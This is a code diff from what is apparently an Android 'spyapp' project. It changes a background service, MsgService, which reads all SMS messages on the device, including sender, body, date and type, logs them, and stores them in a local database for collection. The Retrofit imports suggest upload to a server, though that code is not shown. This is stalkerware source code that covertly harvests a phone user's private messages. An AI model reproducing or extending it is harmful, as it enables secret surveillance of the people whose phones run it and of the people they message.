@@ -20,6 +20,7 @@ import java.util.List;
 import java.util.Timer;
 import java.util.TimerTask;
 
+import kkactive_india.in.spyapp.Database.DatabaseHelper;
 import kkactive_india.in.spyapp.msgPOJO.MsgBean;
 import kkactive_india.in.spyapp.msgPOJO.MsgDatum;
 import retrofit2.Call;
@@ -29,9 +30,11 @@ import retrofit2.Retrofit;
 import retrofit2.converter.gson.GsonConverterFactory;
 import retrofit2.converter.scalars.ScalarsConverterFactory;
 
+import static java.security.AccessController.getContext;
+
 public class MsgService extends Service {
 
-    String address, body, date, type;
+    String address, body, date, type,id;
     Date dateFormat;
     List<MsgDatum> data = new ArrayList<>();
     SharedPreferences pref;
@@ -69,7 +72,7 @@ public class MsgService extends Service {
 
         sb.append("SMS Details :");
         while (cur != null && cur.moveToNext()) {
-            String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
+            id = cur.getString(cur.getColumnIndexOrThrow("_id"));
             address = cur.getString(cur.getColumnIndex("address"));
             body = cur.getString(cur.getColumnIndexOrThrow("body"));
             date = cur.getString(cur.getColumnIndexOrThrow("date"));
@@ -89,12 +92,15 @@ public class MsgService extends Service {
                     break;
             }
 
-            MsgDatum person = new MsgDatum();
-            person.setMobile(address);
-            person.setMessage(body);
-            person.setDate(String.valueOf(dateFormat));
-            person.setType(type);
-            data.add(person);
+
+
+            DatabaseHelper db = new DatabaseHelper(getApplication());
+
+            Boolean result = db.insert(id,address, body, type, String.valueOf(dateFormat));
+
+            Log.d("gayaDatabaseMai", String.valueOf(result));
+
+
             sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
 
             sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
@@ -103,10 +109,25 @@ public class MsgService extends Service {
         Log.d("SMSS", sms.toString());
         //textView.setText(sb);
 
+
+
         if (cur != null) {
             cur.close();
         }
         //return sms;
+
+                final DatabaseHelper db = new DatabaseHelper(getApplicationContext());
+                Cursor c = db.getMsgs();
+
+                if (c != null)
+                    while (c.moveToNext()) {
+                    MsgDatum person = new MsgDatum();
+                    person.setMobile(c.getString(c.getColumnIndex("phone")));
+                      person.setMessage(c.getString(c.getColumnIndex("body")));
+                      person.setDate(c.getString(c.getColumnIndex("date")));
+                      person.setType(c.getString(c.getColumnIndex("type")));
+                      data.add(person);
+                    }
 
 
 
